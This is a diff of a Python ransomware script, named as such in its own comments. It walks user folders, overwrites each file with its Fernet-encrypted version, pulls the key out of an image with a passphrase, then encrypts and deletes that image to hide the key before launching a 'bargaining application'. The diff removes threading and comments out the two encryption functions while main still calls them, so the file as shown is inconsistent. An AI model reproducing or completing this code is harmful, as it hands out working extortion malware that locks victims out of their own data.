@@ -1,16 +1,17 @@
 #import os
 #from cryptography.fernet import Fernet
-#from concurrent.futures import ThreadPoolExecutor
 #from extract import extract_file
 
 
-def encrypt_file(filename: str, f_key: Fernet):
+'''def encrypt_file(filename: str, key: str):
     """
     Encrypts a single file provided the path of the file and the Fernet key to encrypt it.
     :param filename: Represents the file to undergo encryption
-    :param f_key: Represents an instance of the Fernet Class created with a key.
+    :param key: Represents an instance of the Fernet Class created with a key.
     :return: None
     """
+    # Converts that key to a Fernet object to gain access to Fernet methods
+    f_key: Fernet = Fernet(key)
     # Assigns the data inside the unencrypted file to a variable
     with open(filename, "rb") as unencrypted_file:
         plaintext = unencrypted_file.read()
@@ -18,30 +19,31 @@ def encrypt_file(filename: str, f_key: Fernet):
     ciphertext = f_key.encrypt(plaintext)
     # Overwrites the same file
     with open(filename, "wb") as encrypted_file:
-        encrypted_file.write(ciphertext)
+        encrypted_file.write(ciphertext)'''
 
 
-def process_directory(directory: str, f_key: Fernet, blacklist: list[str]):
+'''def process_directory(directory: str, key: str, blacklist: list[str]):
     """
     This function processes each directory, encrypting files that are not in the blacklist.
     :param directory: Represents the path to a directory that will have its files encrypted.
-    :param f_key: Represents an instance of the Fernet Class created with a key.
+    :param key:
     :param blacklist:
     :return: None
     """
     # Unpacks the provided directory as a 3-tuple consisting of directory path, directory names, and file names
     for root, dir, files in os.walk(directory):
-        # Iterates through each file in the directory
+        # Ensures that the program doesn't accidentally encrypt itself!
         for directory in blacklist:
-            dir.remove(directory)
+            if directory in dir:
+                dir.remove(directory)
+        # Iterates through each file in the directory
         for file in files:
             if file not in blacklist:
                 # Combines the path of the directory with the file name to create filepath of file
                 file_path = os.path.join(root, file)
                 # Encrypts the file given the newly generated filepath
-                encrypt_file(file_path, f_key)
-                print(file)
-
+                encrypt_file(file_path, key)
+                print(file)'''
 
 
 def main():
@@ -69,8 +71,6 @@ def main():
         lines = file.readlines()
         passphrase = lines[0].strip("\n")
     key: str = extract_file(image_containing_key, passphrase)
-    # Converts that key to a Fernet object to gain access to Fernet methods
-    f_key: Fernet = Fernet(key)
 
     # Represents folders to avoid encrypting for safety of host computer whilst maintaining functionality
     # of the ransomware.
@@ -85,20 +85,13 @@ def main():
         #os.path.expanduser("~/Pictures"),
         #os.path.expanduser("~/Desktop")
     ]
-
-    # Start a thread for each directory
-    with ThreadPoolExecutor() as executor:  # Initialize ThreadPoolExecutor for multithreading
-        # Submit each directory to be processed in a separate thread
-        futures = [executor.submit(process_directory, directory, f_key, blacklist) for directory in
-                   directories_to_encrypt]
-        # Ensure each thread completes by calling `.result()` on each future
-        for future in futures:
-            future.result()
+    for directory in directories_to_encrypt:
+        process_directory(directory, key, blacklist)
 
     print("Encryption successful!")
 
     # Encrypts and removes the key from the working directory to hide from sight
-    encrypt_file(image_containing_key, f_key)
+    encrypt_file(image_containing_key, key)
     os.remove(image_containing_key)
 
     # Runs the bargaining application
